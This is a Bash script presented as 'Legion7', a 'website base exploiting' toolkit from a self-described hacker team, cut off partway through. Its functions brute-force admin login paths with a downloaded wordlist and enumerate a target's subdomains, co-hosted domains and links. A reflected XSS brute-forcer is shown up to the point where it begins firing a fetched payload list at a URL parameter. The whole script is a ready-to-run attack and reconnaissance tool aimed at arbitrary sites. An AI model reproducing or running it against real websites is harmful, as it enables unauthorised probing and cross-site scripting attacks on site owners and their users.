#!/bin/bash

##########################################################################
##                                                                      ##
##    Name       :    Legion7 ( Website Base Exploiting Tools )           ##
##    Author     :    ZeroTeeN7Mexs_                                 ##
##    Version    :    2.0                                               ##
##    Team     :    Legion7 Hecker's Team                              ##
##                                                                      ##
##########################################################################


## COLORS
RED="$(printf '\033[0;31m')"  GREEN="$(printf '\033[0;32m')"  YELLOW="$(printf '\033[0;33m')"  BLUE="$(printf '\033[0;34m')"  PINK="$(printf '\033[0;35m')"  CYAN="$(printf '\033[0;36m')" WHITE="$(printf '\033[0;37m')"

## FONTS
BLOD="$(printf '\033[1m')"  FAD="$(printf '\033[2m')" ITA="$(printf '\033[3m')" DEL="$(printf '\033[9m')"

## RESAT COLOR AND FONT
RESAT="$(printf '\033[0m')"

## BANNER PROCESS
# SLIDE BANNERS
SLIDE_BANNER() {
    slide=$((1 + RANDOM % 4))
    banner${slide}
}

banner1()
{
clear;
cat << EOF

${GREEN}                                                           ${RESAT}
${GREEN}         @@@  @@@  @@@  @@@@@@@@  @@@@@@@   @@@  @@@  @@@  ${RESAT}
${GREEN}         @@@  @@@  @@@  @@@@@@@@  @@@@@@@@  @@@  @@@@ @@@  ${RESAT}
${GREEN}         @@!  @@!  @@!  @@!       @@!  @@@  @@!  @@!@!@@@  ${RESAT}
${GREEN}         !@!  !@!  !@!  !@!       !@   @!@  !@!  !@!!@!@!  ${RESAT}
${GREEN}         @!!  !!@  @!@  @!!!:!    @!@!@!@   !!@  @!@ !!@!  ${RESAT}
${GREEN}         !@!  !!!  !@!  !!!!!:    !!!@!!!!  !!!  !@!  !!!  ${RESAT}
${GREEN}         !!:  !!:  !!:  !!:       !!:  !!!  !!:  !!:  !!!  ${RESAT}
${GREEN}         :!:  :!:  :!:  :!:       :!:  !:!  :!:  :!:  !:!  ${RESAT}
${GREEN}          :::: :: :::    :: ::::   :: ::::   ::   ::   ::  ${RESAT}
${GREEN}           :: :  : :    : :: ::   :: : ::   :    ::    :   ${RESAT}
${GREEN}                                                           ${RESAT}
   
EOF
}

banner2()
{
clear;
cat << EOF

${GREEN}         ,,                ,,      ${RESAT}
${GREEN}       (((((              )))))    ${RESAT}
${GREEN}      ((((((              ))))))   ${RESAT}
${GREEN}      ((((((              ))))))   ${RESAT}
${GREEN}       (((((,r@@@@@@@@@@e,)))))    ${RESAT}
${GREEN}        (((@@@@@@@@@@@@@@@@)))     ${RESAT} [${GREEN}${BLOD}PrivateTools${RESAT}]
${GREEN}         \@@/${CYAN}${BLOD},:::,${RESAT}${GREEN}\/${CYAN}${BLOD},:::,${RESAT}${GREEN}\\${GREEN}/@@    ${RESAT}
${GREEN}        /@@@|${CYAN}${BLOD}:::::${RESAT}${GREEN}||${CYAN}${BLOD}:::::${RESAT}${GREEN}|${GREEN}@@@\    ${RESAT}
${GREEN}       / @@@\\${CYAN}${BLOD}':::'${RESAT}${GREEN}/\\${CYAN}${BLOD}':::'${RESAT}${GREEN}/${GREEN}@@@ \ ${RESAT}       Author  ${GREEN}:${RESAT}  ZeroTeeN7Mexs_   
${GREEN}      /  /@@@@@@@//\\@@@@@@@@\  \     ${RESAT} Version  ${GREEN}:${RESAT}  2.0
${GREEN}     (  /  '@@@@@====@@@@@'  \  )     ${RESAT} Team  ${GREEN}:${RESAT}  Legion7 Heckers Team
${GREEN}      \(     /          \     )/    ${RESAT}
${GREEN}        \   (            )   /      ${RESAT}
${GREEN}             \          /           ${RESAT}

EOF
}

banner3()
{
clear;
echo -e "\n${GREEN}                          .____      ${RESAT}"
echo -e "${GREEN}                          |---.\     ${RESAT}"
echo -e "${GREEN}                  ___     |    .     ${RESAT}"
echo -e "${GREEN}                 / .-\  ./=)         ${RESAT}"
echo -e "${GREEN}                |  |'|_/\/|          ${RESAT}"
echo -e "${GREEN}                ;  |-;| /_|        ${RESAT}[ ${GREEN}${BLOD}PrivateTools${RESAT}]"
echo -e "${GREEN}               / \_| |/ \ |          ${RESAT}"
echo -e "${GREEN}              /      \/\( |          ${RESAT}"
echo -e "${GREEN}              |   /  |  ) |    ${RESAT}    Author  ${GREEN}:${RESAT}  ZeroTeeN7Mexs${RESAT}"
echo -e "${GREEN}              /   \ _/    |    ${RESAT}   Version  ${GREEN}:${RESAT}  2.0${RESAT}"
echo -e "${GREEN}             /--._/  \    |    ${RESAT}    Team  ${GREEN}:${RESAT}  Legion7 Hecker's Team${RESAT}"
echo -e "${GREEN}             ./|)    |    /          ${RESAT}"
echo -e "${GREEN}               /     |   |           ${RESAT}"
echo -e "${GREEN}             .'      |   |           ${RESAT}"
echo -e "${GREEN}            /         \  |           ${RESAT}"
echo -e "${GREEN}           (_.-.__.__./  /           ${RESAT}\n"
}

banner4()
{
clear;
echo -e "\n${GREEN}                          .____      ${RESAT}"
echo -e "${GREEN}                          |---.\     ${RESAT}"
echo -e "${GREEN}                  ___     |    .     ${RESAT}"
echo -e "${GREEN}                 / .-\  ./=)         ${RESAT}"
echo -e "${GREEN}                |  |'|_/\/|          ${RESAT}"
echo -e "${GREEN}                ;  |-;| /_|        ${RESAT}[ ${GREEN}${BLOD}PrivateTools${RESAT}]"
echo -e "${GREEN}               / \_| |/ \ |          ${RESAT}"
echo -e "${GREEN}              /      \/\( |          ${RESAT}"
echo -e "${GREEN}              |   /  |  ) |    ${RESAT}    Author  ${GREEN}:${RESAT}  ZeroTeeN7Mexs${RESAT}"
echo -e "${GREEN}              /   \ _/    |    ${RESAT}   Version  ${GREEN}:${RESAT}  2.0${RESAT}"
echo -e "${GREEN}             /--._/  \    |    ${RESAT}    Team  ${GREEN}:${RESAT}  Legion7 Hecker's Team${RESAT}"
echo -e "${GREEN}             ./|)    |    /          ${RESAT}"
echo -e "${GREEN}               /     |   |           ${RESAT}"
echo -e "${GREEN}             .'      |   |           ${RESAT}"
echo -e "${GREEN}            /         \  |           ${RESAT}"
echo -e "${GREEN}           (_.-.__.__./  /           ${RESAT}\n"
}

# MESSAGE OF WHEN USER RUN SCRIPT
wlctext()
{
cat << EOF
   +-----------------------------------------------------------+
   |  ${GREEN}${BLOD} Wellcome to  Legion7 ( website base exploiting tools )${RESAT}   |
   +-----------------------------------------------------------+

EOF
}

# MESSAGE OF WHEN USER ABORT
exit_msg()
{
    echo -e "\n  [ ${RED}!${RESAT} ]  ${RED}the process of program was abort by the user${RESAT}"
    echo -e "  [ ${GREEN}+${RESAT} ]  thz for useing this tool ${RED}${BLOD}<3${RESAT} , Bye..."
    exit 0
}

# MESSAGE OF INVAILD OPTIONS
invaild_op_msg()
{
    echo -e "\n [ ${RED}!${RESAT} ] invalid option "
    sleep 0.5
}

trap exit_msg SIGINT

# BASIC OUTPUT
NT() { printf " ${WHITE}[${BLUE}$(date +%T)${WHITE}]${RESAT}"
}
GT() { printf " ${WHITE}[${GREEN}$(date +%T)${WHITE}]${RESAT}"
}
WT() { printf " ${WHITE}[${YELLOW}$(date +%T)${WHITE}]${RESAT}"
}
ET() { printf " ${WHITE}[${RED}$(date +%T)${WHITE}]${RESAT}"
}
start_time() { printf "$(NT)  start time of webin process  @  ( ${FAD}$(date)${RESAT} )"
}
end_time() { printf "$(NT)  end time of webin process  @  ( ${FAD}$(date)${RESAT} )"
}

# INSTALL REQUIRMENT PACKAGE AND SETUP

    if [[ ! -d ./wordlist ]]; then
        mkdir -p "./wordlist" && cd wordlist/ && wget --no-check-certificate "https://raw.githubusercontent.com/1337r0j4n/webin/main/wordlist/admin_panel.txt" && wget --no-check-certificate "https://raw.githubusercontent.com/1337r0j4n/webin/main/wordlist/xss_payloads.txt"
    fi

    if [[ ! -d ./output ]]; then
        mkdir -p "output"
    fi

dependencies_pkg()
{
    pkg=(grep curl dnsutils wget sed awk vim xxd)
        for pkg in "${pkg[@]}";do
            command -v $pkg >/dev/null 2>&1 || apt-get install $pkg -y
        done
}

# USER AGENT
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"

# CHECK THE NETWORK CONNECTION
CHECK_NETWORK()
{
echo -e "$(NT)  checking the network connection"
sleep 1
ip=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -n 1)
    if [[ $ip == "" ]]; then
        echo -e "$(ET)  ${RED}no internet connection${RESAT}"
        sleep 0.5
        echo -e "$(WT)  ${YELLOW}please check your connection and try again!${RESAT}"
        exit 1
    else
        printf ''

    fi
}

# CHECK HOST
CHECK_HOST()
{
echo -e "$(NT)  testing the connection to the target: ${BLOD}$site${RESAT}"
host=$(curl -o /dev/null --write-out '%{http_code}\n' -A "$USER_AGENT" --max-time 30 -I -s -L -k $site)
    if [[ "$host" == '000' ]]; then
        echo -e "$(ET)  ${RED}unable to connect to the target: ${BLOD}$site${RESAT}"
        exit 1
    else
        echo -e "$(GT)  target: ${BLOD}$site${RESAT}  is stable  [ status code:$host ]"
        if [[ -f output/$site/*.txt ]]; then
            cd output/$site/ && rm -rf * && mkdir -p "./output/$site"
        else
            mkdir -p "./output/$site"
        fi
    fi
}

## TOOLS
# ADMIN PANEL FINDER
ADMINPANELFINDER()
{
echo -e "$(NT)  the thread of request may not show 400${FAD}(except for 403)${RESAT} < 599 http status codes"
while ISF= read -r path ;do
url="http://$site/$path"
statuscode=$(curl -o /dev/null --write-out '%{http_code}\n' -A "$USER_AGENT" --max-time 5 -I -s -L -k $url)
    if [[ $statuscode == $(echo 1**) ]] || [[ $statuscode == $(echo 2**) ]] || [[ $statuscode == $(echo 3**) ]]; then
         echo -e "$(GT)  possible login page [ status code:${GREEN}$statuscode${RESAT} ]: ${GREEN}$url${RESAT} "
         echo "$statuscode:$url" >> "./output/$site/adminpanel.txt"
  elif [[ $statuscode == 403 ]]; then
         echo -e "$(WT)  possible login page [ status code:${YELLOW}$statuscode${RESAT} ]: ${YELLOW}$url${RESAT} "
         echo "$statuscode:$url" >> "./output/$site/adminpanel.txt"
  else
         printf ''
     fi
done < wordlist/admin_panel.txt
}

WEBIN_ADMINPANELFINDER()
{
SLIDE_BANNER;
cat << EOF
   +-----------------------------------------------------------+
   |   ${BLOD}${GREEN} legion7 ${WHITE}(${RESAT} ${GREEN}a d m i n   p a n e l  f i n d e r ${WHITE})${RESAT}     |
   +-----------------------------------------------------------+

EOF
echo -e "$(start_time)"
CHECK_NETWORK
echo -e "$(NT)  enter the target ${BLOD}url/domain${RESAT} ${FAD}( www.example.com )${RESAT}"
read -p " [ ${YELLOW}target${RESAT} ]: " target
site=$(echo $target | sed 's!http[s]*://!!g' | cut -d "/" -f 1)
CHECK_HOST
    read -p "$(NT)  what directory file do you want to use? ${FAD}(y:default/n:custom)${RESAT}[Y/n] " x
    if [[ $x == "n" || $x == "N" ]]; then
         echo -e "$(NT)  enter the custom wordlist file path"
         read -p " [${YELLOW}wordlist${RESAT}]: " custom_wordlist
             if [[ -e "$custom_wordlist" ]]; then
                  echo -e "$(GT)  custom wordlist file: ${ITA}$custom_wordlist  ${RESAT}"
                  echo -e "$(NT)  total count of custom wordlist file: ${GREEN}$(cat $custom_wordlist | wc -l)${RESAT} generate words"
                  echo -e "$(NT)  the thread of request may not show 400${FAD}(except for 403)${RESAT} < 599 http status code"
                      while ISF= read -r path ;do
                      url="http://$site/$path"
                      statuscode=$(curl -o /dev/null --write-out '%{http_code}\n' -A "$USER_AGENT" --max-time 5 -I -s -L -k $url)
                          if [[ $statuscode == `echo 1**` ]] || [[ $statuscode == `echo 2**` ]] || [[ $statuscode == `echo 3**` ]]; then
                              echo -e "$(GT)  possible login page [ status code:${GREEN}$statuscode${RESAT} ]: ${GREEN}$url${RESAT} "
                              echo "$statuscode:$url" >> "./output/$site/adminpanel.txt"
                        elif [[ $statuscode == 403 ]]; then
                              echo -e "$(WT)  possible login page [ status code:${YELLOW}$statuscode${RESAT} ]: ${YELLOW}$url${RESAT} "
                              echo "$statuscode:$url" >> "./output/$site/adminpanel.txt"
                        else
                              printf ''
                          fi
                      done < $custom_wordlist
           else
                 echo -e "$(ET)  ${RED}wordlist file: $custom_wordlist  does not exist${RESAT}"
                 echo -e "$(GT)  the process will work with default wordlist file: ${ITA}$PWD/wordlists/admin_panel.txt${RESAT}"
                 echo -e "$(NT)  total count of default wordlist file: ${GREEN}$(cat ./wordlist/admin_panel.txt | wc -l)${RESAT} generate words"
                 ADMINPANELFINDER
             fi
    else
        echo -e "$(GT)  default wordlist file: ${ITA}$PWD/wordlist/admin_panel.txt${RESAT}"
        echo -e "$(NT)  total count of default wordlist file: ${GREEN}$(cat ./wordlist/admin_panel.txt | wc -l)${RESAT} generate words"
        ADMINPANELFINDER
    fi
echo -e "$(NT)  request data was saved under ${ITA}$PWD/output/$site/adminpanel.txt${RESAT}"
echo -e "$(end_time)"
exit 1
}

# BASIC INFORMATION SCANNER
CLEANLOG() {
if [[ -f output/$site/basicinfo.txt ]]; then
    cd output/$site/ && rm -rf *
fi
}

WEBIN_BASICINFORMATIONSCANNER()
{
SLIDE_BANNER;
cat << EOF
   +--------------------------------------------------------------------+
   |${BLOD}${GREEN}  legion7 ${WHITE}(${RESAT}  ${GREEN}b a s i c  i n f o r m a t i o n  s c a n n e r  ${WHITE})${RESAT}  |
   +--------------------------------------------------------------------+

EOF
echo -e "$(start_time)"
CHECK_NETWORK
echo -e "$(NT)  enter the target ${BLOD}url/domain${RESAT} ${FAD}( www.example.com )${RESAT}"
read -p " [ ${YELLOW}target${RESAT} ]: " target
site=$(echo $target | sed 's!http[s]*://!!g' | cut -d "/" -f 1)
CLEANLOG
CHECK_HOST
url="http://$target"
    echo -e "$(NT)  scanning basice information of target\n"
    # GET INDEX PAGE TITLE OF TARGET
    title=$(curl -A "$USER_AGENT" --max-time 10 -s -L -k $url | grep -oE "<title>.*</title>" | sed 's/<title>//' | sed 's/<\/title>//')
    printf "%-20s %s\n" "      HTML Title " ": $title"
    echo "title:$title" >> output/$site/basicinfo.txt
   # GET IP OF TARGET
    site=$(echo $url | sed 's!http[s]*://!!g' | cut -d "/" -f 1)
    ip=$(host $site | grep "has address" | cut -d " " -f 4 | head -1)
    printf "%-20s %s\n" "      IP Address " ": $ip"
    echo "ip:$ip" >> output/$site/basicinfo.txt
    # GET SERVER NAME
    server=$(curl -A "$USER_AGENT" --max-time 5 -s -L -k -I $url | grep "Server" | cut -d " " -f 2)
    printf "%-20s %s\n" "      HTTP Server " ": $server"
    echo "server:$server" >> output/$site/basicinfo.txt
    # GET COUNTRY
    country=$(whois $site | grep "Registrant Country:" | cut -d " " -f 3)
    printf "%-20s %s\n" "      Country " ": $country"
    echo "country:$country" >> output/$site/basicinfo.txt
    # GET CMS
    printf "%-20s %s\n" "      CMS " ": `SINGLE`"
    echo `SINGLE` >> output/$site/basicinfo.txt
    # SCAN PHPMYADMIN
    pma=$(curl -A "$USER_AGENT" --max-time 10 -s -L -k -I $url/phpmyadmin | grep -o "phpmyadmin.net" )
        if [[ $pma == "phpmyadmin.net" ]]; then
            printf "%-20s %s\n" "      phpMyAdmin " ": Found"
            echo "$url/phpmyadmin" >> output/$site/basicinfo.txt
        else
            printf ''
        fi
    # SCAN ROBOTS.TXT FILE THAT CONTAINING INFOMATIONS
    robot=$(curl -o /dev/null --write-out '%{http_code}\n' -A "$USER_AGENT" --max-time 10 -s -L -k -I $url/robots.txt)
        if [[ $robot == "200" ]]; then
            curl -A "$USER_AGENT" -s -k -L $url/robots.txt > output/$site/robots.txt
            printf "%-20s %s\n" "      robots.txt " ": $url/robots.txt"
            echo "$url/robots.txt" >> output/$site/basicinfo.txt
        else
            printf ''
        fi
    echo -e "\n$(NT)  the process of basic information scanning has been done"
    echo -e "$(NT)  scanning result was saved by this name called basicinfo.txt"
    # REVERSE IP LOOKUP
    echo -e "$(NT)  finding other websites hosted on a IP: ${BLOD}$ip${RESAT}"
    curl -A "$USER_AGENT" --max-time 10 -s -L -k "https://api.reverseipdomain.com/?ip=$ip" | jq -r '.result[]' >> output/$site/reverseip.txt
    read -p "$(NT)  total domains: ${GREEN}$(cat output/$site/reverseip.txt | sort -u | wc -l)${RESAT}  found on the same host.Do you want to show?[Y/n] " x
        if [[ $x == "n" ]]; then
            printf ''
        else
            echo ""
                while IFS= read -r domains; do
                    echo "      $domains"
                done < output/$site/reverseip.txt | sort -u
            echo ""
        fi
    echo -e "$(NT)  the process of reverse IP lookup has been done"
    # SUBDOMAINS ENUMERATION
    echo -e "$(NT)  running subdomains enumerations process to find subdomains"
    curl -A "$USER_AGENT" --max-time 10 -s -L -k "https://api.hackertarget.com/hostsearch/?q=$site" | grep -oE "[a-zA-Z0-9._-]+\.$site" >> output/$site/subdomains.txt
    curl -A "$USER_AGENT" --max-time 10 -s -L -k "https://jldc.me/anubis/subdomains/$site" | grep -oE "[a-zA-Z0-9._-]+\.$site" >> output/$site/subdomains.txt
    read -p "$(NT)  total subdomains: ${GREEN}$(cat output/$site/subdomains.txt | sort -u | wc -l)${RESAT} found.Do you want to show?[Y/n] " x
        if [[ $x == "n" ]]; then
            printf ''
        else
            echo ""
                while IFS= read -r domains; do
                    echo "      $domains"
                done < output/$site/subdomains.txt | sort -u
            echo ""
        fi
    # EXTRACT CONTECT LINK
    link=$(curl -A "$USER_AGENT" --max-time 5 -s -L -k $url | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | cut -d "/" -f 3 | sort -u)
    link_html=$(curl -A "$USER_AGENT" --max-time 5 -s -L -k $url | grep -Pao 'href="[^"]*' | tr -d "#" | sed 's/href="//g' | sed 's/--//g' | grep '.html' | sort -u)
    link_php=$(curl -A "$USER_AGENT" --max-time 5 -s -L -k $url | grep -Pao 'href="[^"]*' | tr -d "#" | sed 's/href="//g' | sed 's/--//g' | grep '.php' | sort -u)
    link_js=$(curl -A "$USER_AGENT" --max-time 5 -s -L -k $url | grep -Pao 'src="[^"]*' | tr -d "#" | sed 's/src="//g' | sed 's/--//g' | grep ".js" | sort -u)
    link_css=$(curl -A "$USER_AGENT" --max-time 5 -s -L -k $url | grep -Pao 'href="[^"]*' | tr -d "#" | sed 's/href="//g' | sed 's/--//g' | grep '.css' | sort -u)
    link_img=$(curl -A "$USER_AGENT" --max-time 5 -s -L -k $url | grep -Eo '<img[^>]+src="([^"]+)"' | sed -e 's/<img[^>]src="//' -e 's/"[^>]>//g' | tr -d '"' | sort -u)
    echo -e "$(NT)  extracting website page links"
    echo "$link" > output/$site/websites.txt
    read -p "$(NT)  total websites: ${GREEN}$(cat output/$site/websites.txt | sort -u | wc -l)${RESAT} found.Do you want to show?[Y/n] " x
        if [[ $x == "n"  ]]; then
            printf ''
        else
            echo ""
                while IFS= read -r domains; do
                    echo "      $domains"
                done < output/$site/websites.txt
            echo ""
        fi
    echo -e "$(NT)  extracting image link only image extension (JPEG,PNG,GIF,WebP,BMP,SVG,etc...)"
    echo "$link_img" > output/$site/img.txt
    read -p "$(NT)  total image links: ${GREEN}$(cat output/$site/img.txt | sort -u | wc -l)${RESAT} found.Do you want to show?[Y/n] " x
        if [[ $x == "n" ]]; then
            printf ''
        else
            echo ""
                while IFS= read -r links; do
                    echo "      $links"
                done < output/$site/img.txt
            echo ""
        fi
    echo -e "$(NT)  extracting other links formant extension (PHP,HTML,CSS,JS)"
    echo "$link_php" >> output/$site/other.txt
    echo "$link_html" >> output/$site/other.txt
    echo "$link_css" >> output/$site/other.txt
    echo "$link_js" >> output/$site/other.txt
    read -p "$(NT)  total links: ${GREEN}${BLOD}$(cat output/$site/other.txt | sort -u | wc -l)${RESAT} found.Do you want to show?[Y/n] " x
        if [[ $x == "n" ]]; then
            printf ''
        else
            echo ""
                while IFS= read -r links; do
                    echo "      $links"
                done < output/$site/other.txt
            echo ""
        fi
echo -e "$(NT)  total log files: ${GREEN}${BLOD}$(ls output/$site/ | wc -l)${RESAT} was saved ${ITA}$(pwd)/output/$site${RESAT}"
echo -e "$(end_time)"
exit 1
}

# BULK DOMAINS TO IP
WEBIN_BULKDOMAINSTOIP()
{
SLIDE_BANNER;
cat << EOF
   +-----------------------------------------------------------+
   |   ${BLOD}${GREEN} legion7  ${WHITE}(${RESAT}  ${GREEN}b u l k  d o m a i n s  t o  I P  ${WHITE})${RESAT}     |
   +-----------------------------------------------------------+

EOF
echo -e "$(start_time)"
CHECK_NETWORK
echo -e "$(NT)  enter the path of bulk domains list that you want to scan"
read -p " [${YELLOW}wordlist${RESAT}]: " list
    if [[ -e $list ]]; then
        echo -e "$(GT)  bulk domains list: $list"
        echo -e "$(NT)  total count of bulk domains list: $(cat $list | wc -l) sites\n"
            while IFS= read -r url;do
                site=$(echo $url | sed 's!http[s]*://!!g' | cut -d "/" -f 1)
                ip=$(host $site | grep "has address" | cut -d " " -f 4 | head -1)
                    if [[ $ip != "" ]]; then
                        printf "%-21s %s\n" "    [ $ip " "] @  $url"
                    else
                        printf "%-21s %s\n" "    [     ${FAD}n o n e${RESAT}    " "] @  $url"
                    fi
            done < $list
    else
        echo -e "$(ET)  ${RED}bulk domain list: $file does not exist${RESAT}"
        echo -e "$(WT)  ${YELLOW}reloading bulk domains to ip tool page${RESAT}"
        sleep 1
        WEBIN_BULKDOMAINSTOIP
    fi
echo -e "\n$(end_time)"
exit 1
}

# GOOGLE DORKING
WEBIN_GOOGLEDORKING()
{
SLIDE_BANNER;
cat << EOF
   +-----------------------------------------------------------+
   |      ${BLOD}${GREEN} legion7   ${WHITE}(${RESAT}   ${GREEN}G O O G L E  d o r k i n g   ${WHITE})${RESAT}      |
   +-----------------------------------------------------------+

EOF
echo -e "$(start_time)"
CHECK_NETWORK
echo -e "$(NT)  enter the dork search query"
read -p " [ ${YELLOW}search${RESAT} ]: " query
query=$(echo $query | tr ' ' '+')
    if [[ $query == "" ]]; then
        echo -e "$(ET)  ${RED}query can't be blank${RESAT}"
        echo -e "$(WT)  ${YELLOW}reloading google dorking tool page${RESAT}"
        sleep 1.5
        WEBIN_GOOGLEDORKING
    fi
echo -e "$(NT)  query: ${GREEN}$query${RESAT}"
echo -e "$(NT)  enter the number of forward pages ${FAD}( you can get 10 sites for 1 forward page )${RESAT}"
read -p " [  ${YELLOW}page${RESAT}  ]: " num
    for x in $(seq $num); do
       dorking=$(curl -A "$USER_AGENT" -s "https://www.google.com/search?q="$query"&start=$((($x-1)*10))" | grep -Eoi '<a [^>]+>' | grep -Eo 'href="[^\"]+"' | grep -o 'http[^&]*' | tr -d '"' | sed 's/%3F/?/g; s/%3D/=/g; s/%26/\&/g' | grep -v "google.com")
       echo "$dorking" >> "ghdbjfizjdimdnvj.txt"
    done
        echo ""
        while IFS= read -r jfkwndjcjdm; do
            echo -e "    $jfkwndjcjdm"
        done < "ghdbjfizjdimdnvj.txt" | sort -u
        echo ""
read -p "$(NT)  do you want to save this ouput file?[Y/n] " x
    if [[ $x == n ]]; then
        rm "ghdbjfizjdimdnvj.txt"
    else
        read -p "$(NT)  enter the output file name : " name
        name=$(echo $name | cut -d "." -f 1)
        if [[ $name == "" ]]; then
            echo -e "$(NT)  result data was save ${ITA}$(pwd)/ghdbjfizjdimdnvj.txt${RESAT}"
        else
            mv ghdbjfizjdimdnvj.txt "$name.txt"
            echo -e "$(NT)  result data was saved ${ITA}$(pwd)/$name.txt${RESAT}"
        fi
    fi
echo -e "$(end_time)"
}

# REVERSE IP LOOKUP
WEBIN_REVERSEIPDOMAINCHECK()
{
SLIDE_BANNER;
cat << EOF
   +----------------------------------------------------------------+
   | ${BLOD}${GREEN} legion7 ${WHITE}(${RESAT}  ${GREEN}r e v e r s e  I P  d o m a i n  c h e c k  ${WHITE})${RESAT}  |
   +----------------------------------------------------------------+

EOF
echo -e "$(start_time)"
CHECK_NETWORK
echo -e "$(NT)  enter the  ${BLOD}IP or DOMAIN${RESAT} to find web hosts sharing an IP address"
read -p " [${YELLOW} domain ${RESAT}]: " target
    site=$(echo $target | sed 's!http[s]*://!!g' | cut -d "/" -f 1)
    ip=$(host $site | grep "has address" | cut -d " " -f 4 | head -1)
    CHECK_HOST
    echo -e "$(NT)  sending requests & waiting response"
    curl -A "$USER_AGENT" --max-time 50 -s -L -k "https://api.hackertarget.com/reverseiplookup/?q=$ip" >> output/$site/reverseip.txt
    curl -A "$USER_AGENT" --max-time 50 -s -L -k "https://api.reverseipdomain.com/?ip=$ip" | jq -r '.result[]' >> output/$site/reverseip.txt
    echo -e "$(NT)  total websites: ${BLOD}${GREEN}$(cat output/$site/reverseip.txt | wc -l)${RESAT} found under this IP: ${BLOD}$(host $site | grep "has address" | cut -d " " -f 4 | head -1)${RESAT}\n"
        while IFS= read -r domains; do
            echo "    $domains"
        done < output/$site/reverseip.txt | sort -u
echo -e "\n$(NT)  result data was saved ${ITA}$(pwd)/output/$site/reverseip.txt${RESAT}"
echo -e "$(end_time)"
exit 1
}

# SUBDOMAIN ENUMERATION
WEBIN_SUBDOMAINENUMERATION()
{
SLIDE_BANNER;
cat << EOF
   +---------------------------------------------------------------+
   |   ${BLOD}${GREEN} legion7 ${WHITE}(${RESAT}  ${GREEN}s u b d o m a i n  e n u m e r a t i o n  ${WHITE})${RESAT}  |
   +---------------------------------------------------------------+

EOF
echo -e "$(start_time) "
CHECK_NETWORK
echo -e "$(NT)  enter the  ${BLOD}DOMAIN${RESAT} for find subdomains associated with that domain"
read -p " [${YELLOW} domain ${RESAT}]: " target
    site=$(echo $target | sed 's!http[s]*://!!g' | cut -d "/" -f 1)
    CHECK_HOST
    echo -e "$(NT)  sending requests & waiting response"
    curl -A "$USER_AGENT" --max-time 10 -s -L -k "https://api.hackertarget.com/hostsearch/?q=$site" | grep -oE "[a-zA-Z0-9._-]+\.$site" >> output/$site/subdomains.txt
    curl -A "$USER_AGENT" --max-time 10 -s -k -L "https://jldc.me/anubis/subdomains/$site" | grep -oE "[a-zA-Z0-9._-]+\.$site" >> output/$site/subdomains.txt
    echo -e "$(NT)  total subdomains: ${BLOD}${GREEN}$(cat output/$site/subdomains.txt | sort -u | wc -l)${RESAT} associated with the target: $site"
    if [[ `cat output/$site/subdomains.txt | sort -u | wc -l` -gt "500" ]]; then
        read -p "$(NT)  do you want to show?[Y/n] " x
            if [[ $x == "Y" || $x == "y" ]]; then
                echo ""
                while IFS= read -r domains; do
                    echo "    $domains"
                done < output/$site/subdomains.txt | sort -u
                echo ""
            fi
    else
        echo ""
        while IFS= read -r domains; do
            echo "    $domains"
        done < output/$site/subdomains.txt | sort -u
        echo ""
    fi
echo -e "$(NT)  result data was saved ${ITA}$(pwd)/output/$site/subdomains.txt${RESAT}"
echo -e "$(end_time)"
exit 1
}

# MASS HTTP STATUS CODE CHECKER
WEBIN_MASSHTTPSTATUSCODECHECKER()
{
SLIDE_BANNER;
cat << EOF
   +-----------------------------------------------------------------------+
   |${BLOD}${GREEN} legion7  ${WHITE}(${RESAT} ${GREEN}m a s s  H T T P  s t a t u s  c o d e  c h e c k e r  ${WHITE})${RESAT} |
   +-----------------------------------------------------------------------+

EOF
echo -e "$(start_time)"
CHECK_NETWORK
echo -e "$(NT)  enter the wordlist file that you want to scan"
read -p " [${YELLOW}wordlist${RESAT}]: " file
    if [[ -f $file ]]; then
        echo -e "$(GT)  wordlist file: ${ITA}$file${RESAT}"
        echo -e "$(NT)  total count of wordlist file: `cat $file | wc -l` generate words\n"
        while IFS= read -r urls; do
            site=$(echo $urls | sed 's!http[s]*://!!g' | cut -d "/" -f 1)
            statuscode=$(curl -o /dev/null --write-out '%{http_code}\n' -A "$USER_AGENT" --max-time 5 -I -s -L -k $site)
                if [[ $statuscode == `echo 1**` ]] || [[ $statuscode == `echo 2**` ]]; then
                     echo -e "     [ ${GREEN}$statuscode${RESAT} ] $site"
                elif [[ $statuscode == `echo 3** ` ]]; then
                     echo -e "     [ ${YELLOW}$statuscode${RESAT} ] $site"
                elif [[ $statuscode == `echo 4** ` ]]; then
                     echo -e "     [ ${RED}$statuscode${RESAT} ] $site"
                elif [[ $statuscode == `echo 5** ` ]]; then
                     echo -e "     [ ${RED}$statuscode${RESAT} ] $site"
                else
                     echo -e "     [ ${FAD}$statuscode${RESAT} ] ${DEL}$site${RESAT}"
                fi
        done < "$file"
    else
        echo -e "$(ET)  ${RED}wordlist file: $file  does not exist${RESAT}"
        echo -e "$(NT)  reloading mass HTTP status code checker tool page"
        WEBIN_MASSHTTPSTATUSCODECHECKER
    fi
echo -e "\n$(end_time)"
exit 1
}

# REFLECTED XSS BRUTEFORC
WEBIN_REFLECTEDXSSBRUTEFORCE()
{
SLIDE_BANNER;
cat << EOF
   +-------------------------------------------------------------------+
   |  ${BLOD}${GREEN} legion7  ${WHITE}(${RESAT}${GREEN}  r e f l e c t e d  X S S  b r u t e f o r c e  ${WHITE})${RESAT}  |
   +-------------------------------------------------------------------+

EOF
echo -e "$(start_time) "
CHECK_NETWORK
echo -e "$(NT)  enter the target ${BLOD}url/domain with parameter${RESAT} ${FAD}( http://www.example.com/search.php?query=xss )${RESAT}"
read -p " [ ${YELLOW}target${RESAT} ]: " target
point=$(echo $target| sed 's/=.*$/=/')
site=$(echo $target | sed 's!http[s]*://!!g' | cut -d "/" -f 1)
CHECK_HOST
echo -e "$(GT)  testing payload to the parameter: ${GREEN}${BLOD}`echo "$target" | grep -oP '(?<=\?)[^=]+'`${RESAT}"
echo -e "$(NT)  bruteforce url: `echo $target | sed 's/=.*$/=/'`${RED}payloads${RESAT}"
echo -e "$(GT)  XSS payloads wordlist file: ${ITA}`pwd`/wordlist/xss_payloads.txt${RESAT}"
echo -e "$(NT)  total count of XSS payloads list: `cat wordlist/xss_payloads.txt | wc -l` generate words"
echo -e "$(WT)  the thread of reflected XSS bruteforce will show only passed payloads\n"
    while IFS= read -r payloads; do
